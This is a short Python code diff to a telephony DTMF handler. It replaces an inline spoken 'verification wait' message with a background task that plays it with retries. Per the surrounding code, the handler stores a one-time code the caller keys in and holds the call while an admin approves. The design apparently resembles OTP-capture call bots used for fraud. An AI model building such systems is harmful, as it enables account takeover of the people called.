@@ -903,12 +903,8 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
             active_sessions[session_id]["status"] = "waiting_approval"
             active_sessions[session_id]["otp_received"] = otp_code
             
-            # Play Step 3 - Verification wait
-            await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification Wait...")
-            step3_text = session["messages"]["step3"]
-            await play_tts(call_id, step3_text, session.get("language", "en"))
-            
-            await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
+            # Play Step 3 with retry (x2)
+            asyncio.create_task(play_step3_with_retry(session_id, session, call_id))
         
     else:
         logger.warning(f"Unexpected DTMF: dtmf={dtmf_value}, step={current_step}, status={status}")
